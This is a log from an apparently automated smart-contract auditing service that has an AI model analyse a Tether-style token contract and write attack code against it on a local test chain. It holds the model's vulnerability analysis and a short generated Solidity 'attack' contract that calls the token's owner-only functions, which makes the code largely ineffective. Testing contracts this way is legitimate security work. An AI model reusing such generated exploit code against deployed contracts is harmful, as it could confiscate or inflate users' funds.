}\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': "1. Contract Analysis:\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Supports pausing/unpausing by owner.\n- Supports blacklisting addresses and destroying their token balances.\n- Has an upgrade mechanism via `deprecated` flag and `upgradedAddress` to forward calls to a new contract.\n- Implements fees on transfers (basisPointsRate and maximumFee), though initially set to zero.\n- Owner can mint new tokens (`issue`) and burn tokens (`redeem`).\n- Uses SafeMath for arithmetic safety.\n- Implements ERC20 standard functions with some additional checks (e.g., payload size).\n- Has owner-only functions to manage blacklist, upgrade, fees, minting, and burning.\n\nThe other contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`) are standard utility or access control contracts supporting the main token contract.\n\n2. Vulnerability Assessment:\n\n- **Centralization / Owner Privileges**:  \n  The owner has extensive powers:\n  - Can pause/unpause the contract, blocking all transfers.\n  - Can blacklist any address, preventing them from transferring tokens.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating tokens.\n  - Can mint unlimited tokens via `issue()`, inflating supply arbitrarily.\n  - Can burn tokens from their own balance via `redeem()`.\n  - Can upgrade the contract to a new address and redirect all calls.\n  - Can set transfer fees (basis points and max fee).\n  \n  **Impact**: This centralization means the owner can censor users, confiscate tokens, inflate supply, or replace the contract logic arbitrarily. This is a trust assumption risk rather than a direct bug, but critical for users to understand.\n\n- **No Timelock or Multisig on Owner Actions**:  \n  All owner functions are single-signature and immediate. No delays or multisig protections exist for sensitive operations like blacklisting, destroying funds, minting, or upgrading.\n\n- **Blacklisting and Destroying Funds**:  \n  The owner can blacklist any user and then call `destroyBlackFunds` to zero their balance and reduce total supply. This is a backdoor to confiscate tokens from any user.\n\n- **Upgrade Mechanism Risks**:  \n  When deprecated, all calls forward to the `upgradedAddress`. The owner can set this address arbitrarily. If the owner sets a malicious upgraded contract, users' tokens and balances can be manipulated or stolen.\n\n- **No Reentrancy or Math Vulnerabilities**:  \n  The contract uses SafeMath and does not handle ETH or external calls, so no reentrancy or arithmetic overflow/underflow issues are present.\n\n- **ERC20 Approve Race Condition Mitigated**:  \n  The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **No ETH Handling**:  \n  The contract does not accept or hold ETH, so no direct ETH theft or locking issues.\n\n3. Exploitation Requirements:\n\n- To exploit the centralization risks, an attacker must gain control of the owner private key or compromise the owner account.\n\n- No direct vulnerabilities allow a non-owner to exploit or steal tokens.\n\n- The owner can arbitrarily blacklist and destroy tokens of any user at any time.\n\n- The owner can mint unlimited tokens, diluting existing holders.\n\n- The owner can upgrade the contract to a malicious version, redirecting all token logic.\n\n---\n\n**Summary:**\n\n- **Solidity Version:** pragma solidity ^0.4.17\n\n- **Main Vulnerabilities:**  \n  - Centralized owner control with powerful privileges (blacklist, destroy funds, mint, pause, upgrade).  \n  - No multisig or timelock on sensitive owner operations.  \n  - Blacklist and destroy funds feature is a backdoor to confiscate tokens.  \n  - Upgrade mechanism can be abused by owner to replace contract logic maliciously.\n\n- **No technical bugs like reentrancy, arithmetic, or unsafe calls found.**\n\n- **Users must trust the owner fully; compromise or malicious intent by owner leads to loss of funds or censorship.**", 'reasoning': 'The main contract with business logic and user funds is **TetherToken**, which is an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Supports pausing/unpausing by owner.\n- Supports blacklisting addresses and destroying their token balances.\n- Has an upgrade mechanism via `deprecated` flag and `upgradedAddress` to forward calls to a new contract.\n- Implements fees on transfers (basisPointsRate and maximumFee), though initially set to zero.\n- Owner can mint new tokens (`issue`) and burn tokens (`redeem`).\n- Uses SafeMath for arithmetic safety.\n- Implements ERC20 standard functions with some additional checks (e.g., payload size).\n- Has owner-only functions to manage blacklist, upgrade, fees, minting, and burning.\n\nThe other contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`) are standard utility or access control contracts supporting the main token contract.\n\n2.', 'summary': "- **Centralization / Owner Privileges**:  \n  The owner has extensive powers:\n  - Can pause/unpause the contract, blocking all transfers.\n  - Can blacklist any address, preventing them from transferring tokens.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating tokens.\n  - Can mint unlimited tokens via `issue()`, inflating supply arbitrarily.\n  - Can burn tokens from their own balance via `redeem()`.\n  - Can upgrade the contract to a new address and redirect all calls.\n  - Can set transfer fees (basis points and max fee).\n  \n  **Impact**: This centralization means the owner can censor users, confiscate tokens, inflate supply, or replace the contract logic arbitrarily. This is a trust assumption risk rather than a direct bug, but critical for users to understand.\n\n- **No Timelock or Multisig on Owner Actions**:  \n  All owner functions are single-signature and immediate. No delays or multisig protections exist for sensitive operations like blacklisting, destroying funds, minting, or upgrading.\n\n- **Blacklisting and Destroying Funds**:  \n  The owner can blacklist any user and then call `destroyBlackFunds` to zero their balance and reduce total supply. This is a backdoor to confiscate tokens from any user.\n\n- **Upgrade Mechanism Risks**:  \n  When deprecated, all calls forward to the `upgradedAddress`. The owner can set this address arbitrarily. If the owner sets a malicious upgraded contract, users' tokens and balances can be manipulated or stolen.\n\n- **No Reentrancy or Math Vulnerabilities**:  \n  The contract uses SafeMath and does not handle ETH or external calls, so no reentrancy or arithmetic overflow/underflow issues are present.\n\n- **ERC20 Approve Race Condition Mitigated**:  \n  The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **No ETH Handling**:  \n  The contract does not accept or hold ETH, so no direct ETH theft or locking issues.\n\n3.", 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(uint amount) external;\n    function redeem(uint amount) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedMalicious) public {\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(1000000 ether);\n        target.deprecate(upgradedMalicious);\n    }\n}', 'code_type': 'solidity', 'duration': 34.72452712059021}
2025-06-23 14:54:54,336 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 14:54:54,338 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 14:54:54,339 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 14:54:54,340 - app.services.contract_service - INFO - Attack strategy summary: - **Centralization / Owner Privileges**:  
  The owner has extensive powers:
  - Can pause/unpause the contract, blocking all transfers.
  - Can blacklist any address, preventing them from transferring tokens.
  - Can destroy tokens of blacklisted addresses, effectively confiscating tokens.
  - Can mint unlimited tokens via `issue()`, inflating supply arbitrarily.
  - Can burn tokens from their own balance via `redeem()`.
  - Can upgrade the contract to a new address and redirect all calls.
  - Can set transfer fees (basis points and max fee).
  
  **Impact**: This centralization means the owner can censor users, confiscate tokens, inflate supply, or replace the contract logic arbitrarily. This is a trust assumption risk rather than a direct bug, but critical for users to understand.

- **No Timelock or Multisig on Owner Actions**:  
  All owner functions are single-signature and immediate. No delays or multisig protections exist for sensitive operations like blacklisting, destroying funds, minting, or upgrading.

- **Blacklisting and Destroying Funds**:  
  The owner can blacklist any user and then call `destroyBlackFunds` to zero their balance and reduce total supply. This is a backdoor to confiscate tokens from any user.

- **Upgrade Mechanism Risks**:  
  When deprecated, all calls forward to the `upgradedAddress`. The owner can set this address arbitrarily. If the owner sets a malicious upgraded contract, users' tokens and balances can be manipulated or stolen.

- **No Reentrancy or Math Vulnerabilities**:  
  The contract uses SafeMath and does not handle ETH or external calls, so no reentrancy or arithmetic overflow/underflow issues are present.

- **ERC20 Approve Race Condition Mitigated**:  
  The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.

- **No ETH Handling**:  
  The contract does not accept or hold ETH, so no direct ETH theft or locking issues.

3.
2025-06-23 14:54:54,341 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 14:54:54,343 - app.services.contract_service - INFO - Temporary file /tmp/tmpllgr4ea4.sol removed
2025-06-23 14:54:54,392 - app.api.contract - INFO - Report saved with filename: Ownable_2025-06-23_14-54, status: KO
2025-06-23 14:54:54,394 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 14:54:54,397 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:54:54,399 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:54:54,400 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:54:54,402 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:54:54,404 - werkzeug - INFO - 192.168.96.1 - - [23/Jun/2025 14:54:54] "POST /analyze HTTP/1.1" 200 -
2025-06-23 15:06:13,955 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 15:06:14,125 - app.app - INFO - Application started
2025-06-23 15:06:14,136 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.144.5:8000
2025-06-23 15:06:14,137 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 15:06:34,389 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 15:06:34,408 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 15:06:34,414 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 15:06:34,418 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 15:06:34,424 - werkzeug - INFO - 192.168.144.1 - - [23/Jun/2025 15:06:34] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 15:06:34,436 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 15:06:34,439 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 15:06:34,440 - app.api.auth - INFO - Request content type: application/json
2025-06-23 15:06:34,443 - app.api.auth - INFO - Processing JSON request
2025-06-23 15:06:34,445 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 15:06:34,919 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 15:06:34,923 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 15:06:34,924 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 15:06:34,925 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 15:06:34,927 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 15:06:34,929 - werkzeug - INFO - 192.168.144.1 - - [23/Jun/2025 15:06:34] "POST /login HTTP/1.1" 200 -
2025-06-23 15:06:56,562 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 15:06:56,571 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 15:06:56,575 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 15:06:56,578 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 15:06:56,581 - werkzeug - INFO - 192.168.144.1 - - [23/Jun/2025 15:06:56] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 15:06:56,605 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 15:06:56,620 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 15:06:56,638 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 15:06:56,646 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpn0n66fsk.sol
2025-06-23 15:06:56,657 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 15:06:56,659 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 15:06:56,795 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-06-23 15:06:57,426 - solcx - INFO - Using solc version 0.4.17
2025-06-23 15:06:57,428 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-06-23 15:06:57,432 - solcx - INFO - Using solc version 0.4.17
2025-06-23 15:07:02,342 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:07:03,440 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-06-23 15:07:03,442 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-06-23 15:07:03,900 - app.services.contract_service - INFO - Contract Ownable deployed at 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550
2025-06-23 15:07:03,901 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-06-23 15:07:04,027 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-06-23 15:07:04,029 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-06-23 15:07:04,180 - app.services.contract_service - INFO - Contract Ownable funded
2025-06-23 15:07:04,595 - app.services.contract_service - INFO - Contract Pausable deployed at 0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb
2025-06-23 15:07:04,596 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-06-23 15:07:05,020 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-06-23 15:07:05,022 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-06-23 15:07:05,203 - app.services.contract_service - INFO - Contract Pausable funded
2025-06-23 15:07:05,556 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-06-23 15:07:05,558 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-06-23 15:07:05,588 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-06-23 15:07:05,589 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-06-23 15:07:05,883 - app.services.contract_service - INFO - Contract SafeMath funded
2025-06-23 15:07:06,444 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:07:07,237 - app.services.contract_service - INFO - Contract TetherToken deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-06-23 15:07:07,240 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-06-23 15:07:10,504 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:07:11,959 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:07:12,978 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:07:13,153 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-06-23 15:07:13,155 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-06-23 15:07:13,333 - app.services.contract_service - INFO - Contract TetherToken funded
2025-06-23 15:07:13,335 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 15:07:16,161 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 15:07:16,163 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 15:07:16,164 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 15:07:16,183 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 15:07:16,217 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 15:07:16,221 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 15:07:16,223 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-06-23 15:07:16,224 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 15:07:16,225 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 15:07:16,241 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 15:07:16,244 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 15:07:16,245 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 15:07:58,160 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:07:58,193 - app.modules.attack_generator - INFO - Received response from OpenAI API in 41.95 seconds
2025-06-23 15:07:58,204 - app.modules.attack_generator - INFO - Contract analysis completed in 41.95 seconds
2025-06-23 15:07:58,205 - app.modules.attack_generator - INFO - Vulnerability assessment: **A. Centralization / Owner Privileges**  
- The owner has extensive control: can pause/unpause tran...
2025-06-23 15:07:58,206 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 15:07:58,209 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 15:07:58,210 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 15:07:58,211 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
